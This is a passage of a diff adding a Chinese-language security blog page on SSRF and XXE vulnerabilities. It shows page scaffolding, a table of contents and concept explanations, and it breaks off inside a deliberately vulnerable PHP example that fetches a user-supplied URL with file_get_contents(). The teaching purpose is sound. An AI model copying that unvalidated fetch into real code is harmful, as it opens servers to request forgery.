@@ -1,0 +1,1447 @@
+  <!DOCTYPE html>
+  <html lang="en"  
+      data-theme-mode="auto"
+  >
+  <head>
+  <meta charset="utf-8">
+  
+  
+  
+  <script>window.REIMU_CONFIG = {};window.REIMU_CONFIG.icon_font = '4552607_4k4bc36ef96';window.REIMU_CONFIG.clipboard_tips = {"success":{"en":"Copy successfully (*^▽^*)"},"fail":{"en":"Copy failed (ﾟ⊿ﾟ)ﾂ"},"copyright":{"enable":false,"count":50,"license_type":"by-nc-sa"}};window.REIMU_CONFIG.clipboard_tips.copyright.content = 'All articles on this blog are licensed under the BY-NC-SA license agreement unless otherwise stated. Please indicate the source when reprinting!';window.REIMU_CONFIG.code_block = {"expand":true};window.REIMU_CONFIG.base = 'https://cl1ck-t0.github.io';</script>
+  <title>
+    SSRF&amp;XXE漏洞 | Cl1ck-t0&#39;s blog
+  </title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="preload" as="style" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic|Noto Serif SC:400,400italic,700,700italic&display=swap"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic|Noto Serif SC:400,400italic,700,700italic&display=swap" media="print" onload="this.media='all'">
+    <link rel="preload" href="//at.alicdn.com/t/c/font_4552607_4k4bc36ef96.woff2" as="font" type="font/woff2" crossorigin="anonymous">
+    
+<link rel="stylesheet" href="/css/loader.css">
+
+    <meta name="description" content="SSRF&amp;XXE漏洞 SSRF和XXE的共同点是：用户表面上提交的是一个地址或一段数据，但程序却让服务器替用户访问了内部资源。  一、前置知识  1.1 漏洞概述 什么是 SSRF？   SSRF（Server-Side Request Forgery，服务端请求伪造）   服务器根据用户输入去请求某个地址，但没有限制好访问范围   攻击者让服务器替自己访问内部资源 SSRF 形成的原因">
+<meta property="og:type" content="article">
+<meta property="og:title" content="SSRF&amp;XXE漏洞">
+<meta property="og:url" content="https://cl1ck-t0.github.io/2026/08/22/SSRF-XXE%E6%BC%8F%E6%B4%9E/index.html">
+<meta property="og:site_name" content="Cl1ck-t0&#39;s blog">
+<meta property="og:description" content="SSRF&amp;XXE漏洞 SSRF和XXE的共同点是：用户表面上提交的是一个地址或一段数据，但程序却让服务器替用户访问了内部资源。  一、前置知识  1.1 漏洞概述 什么是 SSRF？   SSRF（Server-Side Request Forgery，服务端请求伪造）   服务器根据用户输入去请求某个地址，但没有限制好访问范围   攻击者让服务器替自己访问内部资源 SSRF 形成的原因">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2026-08-22T08:25:07.000Z">
+<meta property="article:modified_time" content="2026-09-16T14:49:09.530Z">
+<meta property="article:author" content="Cl1ck-t0">
+<meta property="article:tag" content="web">
+<meta property="article:tag" content="web漏洞">
+<meta name="twitter:card" content="summary">
+    <link rel="alternate" href="/atom.xml" title="Cl1ck-t0's blog" type="application/atom+xml">
+    <link rel="shortcut icon" href="/images/favicon.ico">
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  <link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.css" integrity="sha384-IfxC36XL/toUyJ939C73PcgMuRzAZuIzZxE38drsmO5p6jD7ei+Zx/1oA/0l8ysE" crossorigin="anonymous">
+      <link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="https://npm.webcache.cn/katex@0.16.24/dist/katex.min.css" integrity="sha384-tTgKLjMYmJr94v8qu2PE5MUGSMbyN2xiH266JUB3gpm8vnnJywd1dWSOEfrFz+YI" crossorigin="anonymous">
+    
+<script src="https://npm.webcache.cn/pace-js@1.2.4/pace.min.js" integrity="sha384-k6YtvFUEIuEFBdrLKJ3YAUbBki333tj1CSUisai5Cswsg9wcLNaPzsTHDswp4Az8" crossorigin="anonymous"></script>
+
+    
+<link rel="stylesheet" href="https://npm.webcache.cn/@reimujs/aos@0.1.2/dist/aos.css" integrity="sha384-GMRP93c6Hkz9JVKGAuRR3nTS7M07RwPgTFenXiosjq2VbVgvdDNcz1g6Mkj8AONa" crossorigin="anonymous">
+
+    <link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="https://npm.webcache.cn/aplayer@1.10.1/dist/APlayer.min.css" integrity="sha384-tLMkTWh2pfXNWGFlUS0w1TFtRG5xZ9lPWFOooj+vDDLIL+xBGQU/voDBY5XE2lVh" crossorigin="anonymous">
+<meta name="generator" content="Hexo 8.1.1"></head>
+
+  <body>
+      <div id='loader'>
+    <div class="loading-left-bg loading-bg"></div>
+    <div class="loading-right-bg loading-bg"></div>
+    <div class="spinner-box">
+      <div class="loading-taichi rotate">
+          <svg width="150" height="150" viewBox="0 0 1024 1024" class="icon" version="1.1" xmlns="https://www.w3.org/2000/svg" shape-rendering="geometricPrecision">
+            <path d="M303.5 432A80 80 0 0 1 291.5 592A80 80 0 0 1 303.5 432z" fill="var(--red-1, #ff5252)" />
+            <path d="M512 65A447 447 0 0 1 512 959L512 929A417 417 0 0 0 512 95A417 417 0 0 0 512 929L512 959A447 447 0 0 1 512 65z 
+           M512 95A417 417 0 0 1 929 512A208.5 208.5 0 0 1 720.5 720.5L720.5 592A80 80 0 0 0 720.5 432A80 80 0 0 0 720.5 592L720.5 720.5A208.5 208.5 0 0 1 512 512A208.5 208.5 0 0 0 303.5 303.5A208.5 208.5 0 0 0 95 512A417 417 0 0 1 512 95z" fill="var(--red-1, #ff5252)" />
+          </svg>
+      </div>
+      <div class="loading-word">Loading...</div>
+    </div>
+  </div>
+  </div>
+  <script>
+    var time = null;
+    var loaderEl = document.getElementById('loader');
+    var startLoading = () => {
+      time = Date.now();
+      loaderEl.classList.remove("loading");
+    }
+    var hideLoader = () => {
+      document.body.style.overflow = 'auto';
+      loader.classList.add('loading');
+    };
+
+    var endLoading = () => {
+      if (!time) {
+        hideLoader();
+      } else {
+        if (Date.now() - time > 500) {
+          time = null;
+          hideLoader();
+        } else {
+          setTimeout(endLoading, 500 - (Date.now() - time));
+          time = null;
+        }
+      }
+    }
+    window.addEventListener('DOMContentLoaded', endLoading);
+    loaderEl.addEventListener('click', endLoading);
+  </script>
+<div id="copy-tooltip"></div>
+<div id="heatmap-tooltip"></div>
+
+
+    <div id="container">
+      <div id="wrap">
+        <div id="header-nav">
+  <nav id="main-nav" aria-label="Primary navigation">
+        <a class="main-nav-link-wrap" href="/">
+          <span class="main-nav-link">Home</span>
+        </span>
+        <a class="main-nav-link-wrap" href="/archives">
+          <span class="main-nav-link">Archives</span>
+        </span>
+        <a class="main-nav-link-wrap" href="/about">
+          <span class="main-nav-link">About</span>
+        </span>
+        <a class="main-nav-link-wrap" href="/friend">
+          <span class="main-nav-link">Friend</span>
+        </span>
+        <a class="main-nav-link-wrap" href="/atom.xml">
+          <span class="main-nav-link">rss</span>
+        </span>
+    <a id="main-nav-toggle" class="nav-icon" aria-label="Toggle navigation" role="button"></a>
+  </nav>
+  <nav id="sub-nav" aria-label="Secondary navigation">
+      <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed" aria-label="RSS Feed" target="_blank"></a>
+  </nav>
+</div>
+<header id="header" aria-label="Site header">
+        <picture>
+        </picture>
+          <img  fetchpriority="high" src="/images/banner.webp" alt="SSRF&amp;XXE漏洞">
+  <div id="header-outer">
+    <div id="header-title">
+          <span id="logo">
+            <h1 data-aos="slide-up">SSRF&amp;XXE漏洞</h1>
+          </span>
+        <h2 id="subtitle-wrap" data-aos="slide-down">
+        </h2>
+    </div>
+  </div>
+</header>
+
+        <div id="content" aria-label="Page content"  class="sidebar-right" >
+          <aside id="sidebar" aria-label="Sidebar">
+  <div class="sidebar-wrapper-container sticky">
+      <meting-js
+        theme="var(--color-link)"
+        id="6868625065"
+        server="netease"
+        type="playlist"
+        
+        
+        autoplay="false"
+        loop="all"
+        order="list"
+        
+        volume="0.7"
+        mutex="true"
+        
+        
+      ></meting-js>
+  <div class="sidebar-wrapper">
+    <div class="sidebar-wrap" data-aos="fade-up">
+          <div class="sidebar-toc-sidebar"><h3 class="toc-title">Contents</h3>
+<div class="sidebar-toc-wrapper toc-div-class" >
+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#ssrfxxe%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.</span> <span class="toc-text"> SSRF&amp;XXE漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80-%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86"><span class="toc-number">1.1.</span> <span class="toc-text"> 一、前置知识</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#11-%E6%BC%8F%E6%B4%9E%E6%A6%82%E8%BF%B0"><span class="toc-number">1.1.1.</span> <span class="toc-text"> 1.1 漏洞概述</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#12-%E4%B8%A4%E4%B8%AA%E6%BC%8F%E6%B4%9E%E7%9A%84%E6%A0%B8%E5%BF%83%E5%8C%BA%E5%88%AB"><span class="toc-number">1.1.2.</span> <span class="toc-text"> 1.2 两个漏洞的核心区别</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C-ssrf-%E6%9C%8D%E5%8A%A1%E7%AB%AF%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0"><span class="toc-number">1.2.</span> <span class="toc-text"> 二、SSRF 服务端请求伪造</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#21-%E5%B8%B8%E8%A7%81%E5%9C%BA%E6%99%AF"><span class="toc-number">1.2.1.</span> <span class="toc-text"> 2.1 常见场景</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A1%A5%E5%85%85"><span class="toc-number">1.2.2.</span> <span class="toc-text"> 补充：</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#u%E4%BA%A7%E7%94%9F-ssrf-%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%87%BD%E6%95%B0u"><span class="toc-number">1.2.2.1.</span> <span class="toc-text"> 产生 SSRF 漏洞的函数</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#file_get_contents"><span class="toc-number">1.2.2.1.1.</span> <span class="toc-text"> file_get_contents()</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#fsockopen"><span class="toc-number">1.2.2.1.2.</span> <span class="toc-text"> fsockopen()</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#curl_exec"><span class="toc-number">1.2.2.1.3.</span> <span class="toc-text"> curl_exec()</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#ussrf-%E4%B8%AD-url-%E7%9A%84%E4%BC%AA%E5%8D%8F%E8%AE%AEu"><span class="toc-number">1.2.2.2.</span> <span class="toc-text"> SSRF 中 URL 的伪协议</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#51-file-%E5%8D%8F%E8%AE%AE"><span class="toc-number">1.2.2.2.1.</span> <span class="toc-text"> 5.1 file:&#x2F;&#x2F; 协议</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#52-dict-%E5%8D%8F%E8%AE%AE"><span class="toc-number">1.2.2.2.2.</span> <span class="toc-text"> 5.2 dict:&#x2F;&#x2F; 协议</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#53-sftp-%E5%8D%8F%E8%AE%AE"><span class="toc-number">1.2.2.2.3.</span> <span class="toc-text"> 5.3 sftp:&#x2F;&#x2F; 协议</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#54-ldap-ldaps-ldapi"><span class="toc-number">1.2.2.2.4.</span> <span class="toc-text"> 5.4 ldap:&#x2F;&#x2F; &#x2F; ldaps:&#x2F;&#x2F; &#x2F; ldapi:&#x2F;&#x2F;</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#55-tftp"><span class="toc-number">1.2.2.2.5.</span> <span class="toc-text"> 5.5 tftp:&#x2F;&#x2F;</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#56-gopher-%E5%8D%8F%E8%AE%AE%E9%87%8D%E7%82%B9"><span class="toc-number">1.2.2.2.6.</span> <span class="toc-text"> 5.6 gopher:&#x2F;&#x2F; 协议（重点）</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#22-%E6%94%BB%E5%87%BB%E7%9B%AE%E6%A0%87%E6%B8%85%E5%8D%95"><span class="toc-number">1.2.3.</span> <span class="toc-text"> 2.2 攻击目标清单</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#23-%E6%9C%89%E5%9B%9E%E6%98%BE-vs-%E6%97%A0%E5%9B%9E%E6%98%BE"><span class="toc-number">1.2.4.</span> <span class="toc-text"> 2.3 有回显 vs 无回显</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#24-%E8%BF%87%E6%BB%A4%E4%B8%8E%E7%BB%95%E8%BF%87"><span class="toc-number">1.2.5.</span> <span class="toc-text"> 2.4 过滤与绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#241-%E5%B8%B8%E8%A7%81%E7%9A%84%E8%BF%87%E6%BB%A4%E4%BB%A3%E7%A0%81%E6%9C%89%E7%BC%BA%E9%99%B7"><span class="toc-number">1.2.5.1.</span> <span class="toc-text"> 2.4.1 常见的过滤代码（有缺陷）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#242-%E7%BB%95%E8%BF%87%E6%80%9D%E8%B7%AF"><span class="toc-number">1.2.5.2.</span> <span class="toc-text"> 2.4.2 绕过思路</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#243-%E5%88%86%E6%9E%90%E8%BF%87%E6%BB%A4%E6%97%B6%E7%9A%84%E5%85%B3%E9%94%AE%E9%97%AE%E9%A2%98"><span class="toc-number">1.2.5.3.</span> <span class="toc-text"> 2.4.3 分析过滤时的关键问题</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#25-ssrf-%E9%98%B2%E5%BE%A1%E6%96%B9%E6%A1%88"><span class="toc-number">1.2.6.</span> <span class="toc-text"> 2.5 SSRF 防御方案</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%89-xxe-xml%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5"><span class="toc-number">1.3.</span> <span class="toc-text"> 三、XXE XML外部实体注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#31-%E4%BB%80%E4%B9%88%E6%98%AF-xml-%E5%AE%9E%E4%BD%93"><span class="toc-number">1.3.1.</span> <span class="toc-text"> 3.1 什么是 XML 实体</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#32-xxe-%E5%87%BA%E7%8E%B0%E7%9A%84%E4%BD%8D%E7%BD%AE"><span class="toc-number">1.3.2.</span> <span class="toc-text"> 3.2 XXE 出现的位置</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#33-xxe-%E7%9A%84%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F"><span class="toc-number">1.3.3.</span> <span class="toc-text"> 3.3 XXE 的利用方式</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#331-%E8%AF%BB%E5%8F%96%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6%E6%9C%80%E7%BB%8F%E5%85%B8"><span class="toc-number">1.3.3.1.</span> <span class="toc-text"> 3.3.1 读取本地文件（最经典）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#332-%E8%AE%BF%E9%97%AE%E5%86%85%E7%BD%91%E8%B5%84%E6%BA%90xxe-ssrf"><span class="toc-number">1.3.3.2.</span> <span class="toc-text"> 3.3.2 访问内网资源（XXE → SSRF）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#333-%E5%B8%A6%E5%A4%96%E6%95%B0%E6%8D%AE%E6%B3%84%E9%9C%B2blind-xxe"><span class="toc-number">1.3.3.3.</span> <span class="toc-text"> 3.3.3 带外数据泄露（Blind XXE）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#334-%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1billion-laughs-%E6%94%BB%E5%87%BB"><span class="toc-number">1.3.3.4.</span> <span class="toc-text"> 3.3.4 拒绝服务（Billion Laughs 攻击）</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#34-%E5%81%9A-xxe-%E9%A2%98%E6%97%B6%E7%9A%84%E4%B8%89%E6%AD%A5%E7%A1%AE%E8%AE%A4"><span class="toc-number">1.3.4.</span> <span class="toc-text"> 3.4 做 XXE 题时的三步确认</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#35-xxe-%E9%98%B2%E5%BE%A1%E6%96%B9%E6%A1%88"><span class="toc-number">1.3.5.</span> <span class="toc-text"> 3.5 XXE 防御方案</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9B%9B-%E5%B8%B8%E8%A7%81%E9%97%AE%E9%A2%98"><span class="toc-number">1.4.</span> <span class="toc-text"> 四、常见问题</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#41-%E5%9F%BA%E7%A1%80%E6%A6%82%E5%BF%B5%E9%97%AE%E9%A2%98"><span class="toc-number">1.4.1.</span> <span class="toc-text"> 4.1 基础概念问题</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#42-%E6%A3%80%E6%9F%A5%E4%B8%8E%E7%BB%95%E8%BF%87%E9%97%AE%E9%A2%98"><span class="toc-number">1.4.2.</span> <span class="toc-text"> 4.2 检查与绕过问题</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#43-%E5%88%A9%E7%94%A8%E9%93%BE%E9%97%AE%E9%A2%98"><span class="toc-number">1.4.3.</span> <span class="toc-text"> 4.3 利用链问题</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#44-%E9%98%B2%E5%BE%A1%E9%97%AE%E9%A2%98"><span class="toc-number">1.4.4.</span> <span class="toc-text"> 4.4 防御问题</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%94-%E5%AE%9E%E6%88%98%E6%80%BB%E7%BB%93"><span class="toc-number">1.5.</span> <span class="toc-text"> 五、实战总结</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#51-ssrf-%E6%B5%8B%E8%AF%95%E6%B5%81%E7%A8%8B"><span class="toc-number">1.5.1.</span> <span class="toc-text"> 5.1 SSRF 测试流程</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#52-xxe-%E6%B5%8B%E8%AF%95%E6%B5%81%E7%A8%8B"><span class="toc-number">1.5.2.</span> <span class="toc-text"> 5.2 XXE 测试流程</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#53-%E4%B8%8D%E5%90%8C%E6%A3%80%E6%9F%A5%E7%9A%84%E5%BA%94%E5%AF%B9%E7%AD%96%E7%95%A5"><span class="toc-number">1.5.3.</span> <span class="toc-text"> 5.3 不同检查的应对策略</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%AD-%E6%8B%93%E5%B1%95%E5%86%85%E5%AE%B9"><span class="toc-number">1.6.</span> <span class="toc-text"> 六、拓展内容</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#61-ssrf-%E8%BF%9B%E9%98%B6%E7%BB%95%E8%BF%87%E6%8A%80%E5%B7%A7"><span class="toc-number">1.6.1.</span> <span class="toc-text"> 6.1 SSRF 进阶绕过技巧</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#62-xxe-%E8%BF%9B%E9%98%B6%E6%8A%80%E5%B7%A7"><span class="toc-number">1.6.2.</span> <span class="toc-text"> 6.2 XXE 进阶技巧</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#63-%E9%98%B2%E5%BE%A1%E5%8A%A0%E5%9B%BA%E6%96%B9%E6%A1%88"><span class="toc-number">1.6.3.</span> <span class="toc-text"> 6.3 防御加固方案</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#64-%E5%BF%AB%E9%80%9F%E8%87%AA%E6%A3%80"><span class="toc-number">1.6.4.</span> <span class="toc-text"> 6.4 快速自检</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%99%84%E5%BD%95%E5%B8%B8%E7%94%A8-payload-%E9%9B%86%E5%90%88"><span class="toc-number">1.7.</span> <span class="toc-text"> 附录：常用 Payload 集合</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#ssrf-%E5%B8%B8%E7%94%A8-payload"><span class="toc-number">1.7.1.</span> <span class="toc-text"> SSRF 常用 Payload</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#xxe-%E5%B8%B8%E7%94%A8-payload"><span class="toc-number">1.7.2.</span> <span class="toc-text"> XXE 常用 Payload</span></a></li></ol></li></ol></li></ol>
+</div>
+</div>
+          <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/avatar/avatar.webp" data-sizes="auto" alt="Cl1ck-t0" class="lazyload">
+  <div class="sidebar-author-name">Cl1ck-t0</div>
+  <div class="sidebar-description"></div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>Post</div>
+    <div class="sidebar-state-number">32</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>Category</div>
+    <div class="sidebar-state-number">0</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>Tag</div>
+    <div class="sidebar-state-number">20</div>
+  </div>
+</div>
+<div class="sidebar-social" >
+    <div class="icon-rss sidebar-social-icon">
+      <a href=/atom.xml itemprop="url" target="_blank" aria-label="rss" rel="noopener nofollow noreferrer"></a>
+    </div>
+</div>
+<div class="sidebar-menu">
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/" aria-label="Home"></a>
+        <div class="sidebar-menu-link">Home</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/archives" aria-label="Archives"></a>
+        <div class="sidebar-menu-link">Archives</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/about" aria-label="About"></a>
+        <div class="sidebar-menu-link">About</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/friend" aria-label="Friend"></a>
+        <div class="sidebar-menu-link">Friend</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/atom.xml" aria-label="rss"></a>
+        <div class="sidebar-menu-link">rss</div>
+      </div>
+</div>
+</div>
+          <div class="sidebar-btn-wrapper" style="position:static">
+            <div class="sidebar-toc-btn current"></div>
+            <div class="sidebar-common-btn"></div>
+          </div>
+    </div>
+  </div>
+  <div class="sidebar-widget">
+  </div>
+  </div>
+</aside>
+
+          <section id="main" aria-label="Main content"><article id="post-SSRF-XXE漏洞" class="h-entry article" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-inner" data-aos="fade-up">
+    <div class="article-meta">
+      <div class="article-date">
+  <span class="article-date-link icon-calendar" data-aos="zoom-in">
+    <time datetime="2026-08-22T08:25:07.000Z" itemprop="datePublished">2026-08-22</time>
+    <time style="display: none;" id="post-update-time">2026-09-16</time>
+  </span>
+</div>
+
+    </div>
+    
+    <div class="hr-line"></div>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+        <h1 id="ssrfxxe漏洞"><a class="markdownIt-Anchor" href="#ssrfxxe漏洞"></a> SSRF&amp;XXE漏洞</h1>
+<p>SSRF和XXE的共同点是：用户表面上提交的是一个地址或一段数据，但程序却让服务器替用户访问了内部资源。</p>
+<h2 id="一-前置知识"><a class="markdownIt-Anchor" href="#一-前置知识"></a> 一、前置知识</h2>
+<h3 id="11-漏洞概述"><a class="markdownIt-Anchor" href="#11-漏洞概述"></a> 1.1 漏洞概述</h3>
+<p><strong>什么是 SSRF？</strong></p>
+<ul>
+<li>
+<p>SSRF（Server-Side Request Forgery，服务端请求伪造）</p>
+</li>
+<li>
+<p>服务器根据用户输入去请求某个地址，但没有限制好访问范围</p>
+</li>
+<li>
+<p>攻击者让服务器替自己访问内部资源</p>
+<p>SSRF 形成的原因大都是由于服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制。<br />
+比如,黑客操作服务端从指定URL地址获取网页文本内容，加载指定地址的图片，下载等等。利用的是服务端的请求伪造。ssrf是利用存在缺陷的web应用作为代理攻击远程和本地的服务器</p>
+</li>
+</ul>
+<p><strong>什么是 XXE？</strong></p>
+<ul>
+<li>XXE（XML External Entity，XML 外部实体注入）</li>
+<li>服务器解析 XML 时，允许 XML 中定义并使用外部实体</li>
+<li>攻击者让解析器替自己读取文件或访问网络</li>
+</ul>
+<p><strong>核心思想：</strong></p>
+<p>SSRF = 借用服务器的网络身份去访问资源<br />
+XXE = 借用 XML 解析器的能力去读取/请求资源</p>
+<p>两个漏洞的共同数据流：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">用户输入 → 服务器处理 → 服务器访问其他资源 → 返回结果或产生影响</span><br></pre></td></tr></table></figure>
+<h3 id="12-两个漏洞的核心区别"><a class="markdownIt-Anchor" href="#12-两个漏洞的核心区别"></a> 1.2 两个漏洞的核心区别</h3>
+<table>
+<thead>
+<tr>
+<th style="text-align:left">维度</th>
+<th style="text-align:left">SSRF</th>
+<th style="text-align:left">XXE</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:left">入口</td>
+<td style="text-align:left">URL 参数</td>
+<td style="text-align:left">XML 数据</td>
+</tr>
+<tr>
+<td style="text-align:left">触发点</td>
+<td style="text-align:left">HTTP 请求函数</td>
+<td style="text-align:left">XML 解析器</td>
+</tr>
+<tr>
+<td style="text-align:left">核心能力</td>
+<td style="text-align:left">让服务器发起任意请求</td>
+<td style="text-align:left">让解析器读取文件/发起请求</td>
+</tr>
+<tr>
+<td style="text-align:left">常见目标</td>
+<td style="text-align:left">内网、本机、云元数据</td>
+<td style="text-align:left">本地文件、内网</td>
+</tr>
+</tbody>
+</table>
+<p><strong>重要</strong>：XXE 可以造成 SSRF（见 3.3 节）</p>
+<h2 id="二-ssrf-服务端请求伪造"><a class="markdownIt-Anchor" href="#二-ssrf-服务端请求伪造"></a> 二、SSRF 服务端请求伪造</h2>
+<h3 id="21-常见场景"><a class="markdownIt-Anchor" href="#21-常见场景"></a> 2.1 常见场景</h3>
+<p>开发人员可能用这类功能来做：</p>
+<ul>
+<li>获取远程图片并展示</li>
+<li>生成网页截图（URL 转图片）</li>
+<li>调用第三方 API 接口</li>
+<li>检查链接是否可访问（健康检查）</li>
+<li>下载远程文件</li>
+</ul>
+<p><strong>问题所在</strong>：如果 <code>url</code> 参数完全由用户控制，且服务端没有做充分校验，就会产生漏洞。</p>
+<p>eg.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://title.xxx.com/title?title=http://title.xxx.com/as52ps63de</span><br></pre></td></tr></table></figure>
+<p>例如title参数是文章的标题地址，代表了一个文章的地址链接，请求后返回文章是否保存，收藏的返回信息。如果保存，收藏功能采用了此种形式保存文章，则在没有限制参数的形式下可能存在SSRF。</p>
+<h3 id="补充"><a class="markdownIt-Anchor" href="#补充"></a> 补充：</h3>
+<h4 id="u产生-ssrf-漏洞的函数u"><a class="markdownIt-Anchor" href="#u产生-ssrf-漏洞的函数u"></a> <strong><u>产生 SSRF 漏洞的函数</u></strong></h4>
+<p>SSRF 攻击可能存在于任何语言编写的应用中。以下是 PHP 中常见的危险函数：</p>
+<h5 id="file_get_contents"><a class="markdownIt-Anchor" href="#file_get_contents"></a> file_get_contents()</h5>
+<p><code>file_get_contents()</code> 是 PHP 中用于<strong>将整个文件读入字符串</strong>的函数。当传入 URL 时，它会像浏览器一样发起 HTTP 请求获取内容。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$content</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>]);</span><br><span class="line">    <span class="variable">$filename</span> = <span class="string">&#x27;./images/&#x27;</span> . <span class="title function_ invoke__">rand</span>() . <span class="string">&#x27;.img1.jpg&#x27;</span>;</span><br><span class="line">    <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$filename</span>, <span class="variable">$content</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line">    <span class="variable">$img</span> = <span class="string">&quot;&lt;img src=\&quot;&quot;</span> . <span class="variable">$filename</span> . <span class="string">&quot;\&quot;/&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$img</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span 